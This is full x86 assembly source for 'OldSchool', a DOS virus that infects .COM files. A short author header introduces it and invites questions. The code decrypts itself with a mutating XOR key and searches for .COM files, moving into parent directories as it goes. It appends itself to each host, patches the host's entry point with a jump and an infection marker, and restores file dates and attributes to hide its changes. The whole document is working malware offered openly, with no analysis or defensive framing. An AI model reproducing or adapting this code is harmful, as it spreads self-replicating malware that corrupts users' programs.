;;;;;;;;;;;;;;;;;;;;;;
;; The OldSchool Virus
;;
;; This virus ain't something special, except that it resembles basic
;; techniques of the late '80 early '90 in virus writing.
;; Gues what, that is from where he got his name =)
;;
;; The virus itselft it resembles the following new items (compared with
;; infant-a): multi-encryption (253 states), transversal infection (the
;; famous .. tehnique), multiple-infections per run and some semi-stealth.
;;
;; Feel free to ask questions on any part of the virus at:
;; backbone46 [at] gmail [dot] com
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


	.model tiny
	.code
	ORG	100h				;origin of com

vstart:	call	delta				;get delta offset
delta:	pop	bp
	sub	bp,offset delta			;got it in bp
	call	enk				;call decryption
	jmp	setDTA				;set DTA

enk:	lea	di,[bp+remake]			;start of encrypted block
	mov	si,di				
	mov	cx,vend-remake			;size of block
	kloop:	lodsb
		xor	al,byte ptr [bp+krypt]	;the xor crypt/decrypt
		stosb
		loop	kloop			;crypt/decrypt another byte
	ret

infect:	call	mutate				;mutate key
	call	enk				;enkrypt
	mov	ah,40h				;write virus
	lea	dx,[bp+vstart]			;from vstart
	mov	cx,vend-vstart			;virus size
	int	21h
	mov	ax,4200h			;go to start of file
	xor	cx,cx
	cwd
	int	21h
	call	enk				;decrypt virus
	mov	ah,40h				;write
	lea	dx,[bp+jtabel]			;jump tabel
	mov	cx,4h
	int	21h
	inc	byte ptr [bp+count]		;increase counter of infected files
	ret
	krypt	db	00h			;first time key

remake:	lea	si,[bp+byt4]			;restore original 4 bytes
	mov	di,0100h			
	movsw
	movsw

reset:	mov	ah,1Ah				;reset DTA
	mov	dx,80h
	int	21h
	mov	ax,0100h			;return address
	push	ax				;save
	ret

setDTA:	mov	ah,1Ah				;set new DTA
	lea	dx,[bp+vend]			;appended at virus end
	int	21h

search:	cmp	byte ptr [bp+count],5h		;already 5
	je	reset
	mov	ah,4Eh				;find first function
	lea	dx,[bp+fmask]			;search *.com
	xor	cx,cx

find:	int	21h
	jnc	check				;if found a file check it... else

dotdot:	lea	dx,[bp+ddot]			;load ..
	mov	ah,3Bh				;do transversal
	int	21h
	jc	reset				;no more upward directories
	jmp	search				;new search in new directory

fnext:	cmp	byte ptr [bp+count],5h		;if allready 5
	je	reset				;restore all
	mov	ah,4Fh				;find next
	jmp	find

check:	mov	ah,43h				;get file attributes
	xor	al,al				;for this al=0
	lea	dx,[bp+vend+1Eh]		
	int	21h
	jc	fnext				;access denied... next one
	mov	word ptr [bp+att],cx		;else save them
	mov	ah,43h
	mov	al,1h				;now clear them
	mov	cx,0000h			;attributes=none
	lea	dx,[bp+vend+1Eh]
	int	21h
	jc	fnext				;argh... find another
	mov	ax,3D02h			;open file in read/write mode
	lea	dx,[bp+vend+1Eh]
	int	21h
	jc	fnext				;if open error find next file
	xchg	bx,ax
	mov	ah,3Fh				;read original 4 bytes
	mov	cx,4h
	lea	dx,[bp+byt4]			;save them in byt4
	int	21h
	cmp	byte ptr [bp+byt4+3],'I'	;if infection mark present
	je	cfile				;close file

prolog:	mov	ah,57h				;date and time
	mov	al,0h				;save them
	int	21h
	mov	word ptr [bp+date],dx
	mov	word ptr [bp+time],cx
	mov	ax,4202h			;go to end of file
	xor	cx,cx
	cwd
	int	21h
	sub	al,03h				;calc jump size
	mov	word ptr [bp+jtabel+1],ax	;store it in jump tabel
	call	infect				;do infect routine

cfile:	mov	ah,43h				;restore attributes
	mov	al,1h
	lea	dx, [bp+vend+1Eh]		;to this file
	mov	cx, word ptr [bp+att]
	int	21h
	mov	ah,57h				;restore time and date
	mov	al,1h
	mov	cx, word ptr [bp+time]
	mov	dx, word ptr [bp+date]
	int	21h
	mov	ah,3Eh				;close file
	int	21h
	jmp	fnext				;and find another

mutate:	inc	byte ptr [bp+krypt]		;increase key value
	cmp	byte ptr [bp+krypt],0ffh	;if max value of byte --
	jne	em				;if not max return
	mov	byte ptr [bp+krypt],01h		;-- set it to 01
	em:	ret

variables:
fmask	db	'*.COM',0
ddot	db	'..',0
vname	db	'oldschool',0
count	db	00h
att	dw	0000h
date	dw	0000h
time	dw	0000h
byt4	db	0B4h,4Ch,0CDh,21h
jtabel	db	0E9h,00h,00h,49h
vend:	nop
end	vstart
